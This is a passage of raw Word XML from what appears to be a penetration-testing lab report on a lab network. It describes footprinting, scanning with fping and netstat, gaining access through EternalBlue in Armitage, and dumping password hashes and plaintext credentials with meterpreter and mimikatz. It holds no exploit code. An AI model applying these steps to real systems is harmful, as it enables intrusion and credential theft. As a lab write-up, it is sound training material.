                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="66A28A1C" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>11 Armitage provides a gui to show if a system is compromised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9B1CC8" id="_x0000_s1036" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:191.1pt;width:263.8pt;height:20.65pt;z-index:2516920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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="66A28A1C" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>11 Armitage provides a gui to show if a system is compromised</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251676672" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="510AFC76" wp14:editId="2D8422F2">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>814425</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5942330" cy="1552443"/>
            <wp:effectExtent l="0" t="0" r="127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t="9689" b="43864"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5942330" cy="1552443"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="0011744C">
        <w:t xml:space="preserve">Armitage was used to scan and test commonly </w:t>
      </w:r>
      <w:r w:rsidR="005860BE">
        <w:t>known</w:t>
      </w:r>
      <w:r w:rsidR="0011744C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005860BE">
        <w:t>exploits</w:t>
      </w:r>
      <w:r w:rsidR="0011744C">
        <w:t xml:space="preserve"> against the target network. A</w:t>
      </w:r>
      <w:r w:rsidR="005860BE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0011744C">
        <w:t>connection was made to the target machine using eternal blue</w:t>
      </w:r>
      <w:r w:rsidR="00261D49">
        <w:t xml:space="preserve">. 192.168.0.2. </w:t>
      </w:r>
      <w:r w:rsidR="005860BE">
        <w:t>Armitage was also used to dump the hashed passwords.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> See fig 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7F902B" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="007E1CB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ECAA20D" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="007E1CB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EB7C429" w14:textId="77777777" w:rsidR="00337545" w:rsidRDefault="00337545" w:rsidP="00337545">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AED20E7" w14:textId="77777777" w:rsidR="0011744C" w:rsidRDefault="005860BE" w:rsidP="0011744C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Metasploit was used to access mimikatz, which returned unhashed passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461406C0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0953BC82" w14:textId="77777777" w:rsidR="00337545" w:rsidRDefault="002152BC" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The full mimikatz readout can be viewed at </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ndi</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t xml:space="preserve">x </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="007E1CB4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:t>E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C738903" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="275C245D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="00457C7E" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>PowerShell</w:t>
      </w:r>
      <w:r w:rsidR="00261D49">
        <w:t xml:space="preserve"> was used with an account to view domain admins </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">through </w:t>
      </w:r>
      <w:r w:rsidRPr="00457C7E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>net vie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EBC966" w14:textId="77777777" w:rsidR="006E72FA" w:rsidRDefault="00457C7E" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00261D49">
        <w:t>Admin</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00261D49">
        <w:t xml:space="preserve"> hash password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and others were</w:t>
      </w:r>
      <w:r w:rsidR="00261D49">
        <w:t xml:space="preserve"> found through meterpreter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> using the </w:t>
      </w:r>
      <w:r w:rsidRPr="00457C7E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dump hashes</w:t>
      </w:r>
      <w:r w:rsidRPr="00457C7E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>utility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3499F7B7" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc27518401"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="11C10106" w14:textId="77777777" w:rsidR="008561E4" w:rsidRPr="008561E4" w:rsidRDefault="00261D49" w:rsidP="008561E4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc27518402"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Footprinting Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="3450F8FB" w14:textId="77777777" w:rsidR="008561E4" w:rsidRDefault="008561E4" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="413D5CDB" wp14:editId="6A200736">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>666750</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>480695</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2446020" cy="657225"/>
            <wp:effectExtent l="0" t="0" r="0" b="952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t="52886" r="88866" b="41796"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2446020" cy="657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Visiting the website found a php server running old and flawed </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t>version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t>web calendar running on the servers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216C78B2" w14:textId="77777777" w:rsidR="00727FDF" w:rsidRDefault="00B97061" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251695104" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="69C191A9" wp14:editId="41FDE194">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4590390</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3350260" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
                <wp:wrapTopAndBottom/>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0260" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="03D49746" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>12 ipconfig query results relating to the target network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C191A9" id="_x0000_s1037" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:361.45pt;width:263.8pt;height:20.65pt;z-index:2516951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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="03D49746" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>12 ipconfig query results relating to the target network</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251693056" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="43C3B4CB" wp14:editId="45FBBB45">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1541501</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2870200" cy="2949933"/>
            <wp:effectExtent l="0" t="0" r="6350" b="317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45225" r="4684" b="8221"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2870200" cy="2949933"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t xml:space="preserve">By looking at </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ipconfig/displaydns </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t>the dns names of the servers running on 192.168.0.1 and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF" w:rsidRPr="00B97061">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t>were found to be</w:t>
      </w:r>
      <w:bookmarkStart w:id="13" w:name="_Hlk27439119"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t xml:space="preserve">server1.uadcwnet.com </w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
      <w:r w:rsidR="00727FDF">
        <w:t xml:space="preserve">and server2.uadcwnet.com respectively. </w:t>
      </w:r>
      <w:r>
        <w:t>See fig 12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595F1164" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="00B97061">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F2B032B" w14:textId="77777777" w:rsidR="00727FDF" w:rsidRDefault="00727FDF" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20255A4C" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00261D49" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc27518403"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Scanning Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="5405C8A2" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRDefault="008561E4" w:rsidP="008D6F9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Netstat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – n gave the ip configuration</w:t>
      </w:r>
      <w:r w:rsidR="00B97061">
        <w:t>, see fig 13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEEE370" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="008D6F9E">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251698176" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="654C12A4" wp14:editId="32740FD8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2746477</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3350260" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
                <wp:wrapTopAndBottom/>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0260" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="02A2EF23" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>13  netstat</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> information relating to the target network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4C12A4" id="_x0000_s1038" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:216.25pt;width:263.8pt;height:20.65pt;z-index:2516981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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="02A2EF23" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>13  netstat</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> information relating to the target network</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251696128" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2990AB62" wp14:editId="2E0BA73E">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>939</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2852420" cy="2630170"/>
            <wp:effectExtent l="0" t="0" r="508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45355" t="4207" r="13862" b="28758"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2852420" cy="2630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9831CD" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="008D6F9E">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30BB77E4" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00261D49" w:rsidP="008D6F9E">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22F32764" w14:textId="77777777" w:rsidR="00F901F4" w:rsidRDefault="00F901F4" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">FPING was used to find what was turned on within the network, this was achieved by pinging </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1 to 192.168.0.10</w:t>
      </w:r>
      <w:r w:rsidR="00B97061">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00B97061" w:rsidRPr="00B97061">
        <w:t>see fig 14.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653AFEB1" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="00B97061">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251700224" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="101BCACC" wp14:editId="153F9C59">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>963295</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1142365</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3971925" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="9525" b="4445"/>
                <wp:wrapTopAndBottom/>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1925" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="48C8D042" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">14 fping was used to check all the ips from </w:t>
                            </w:r>
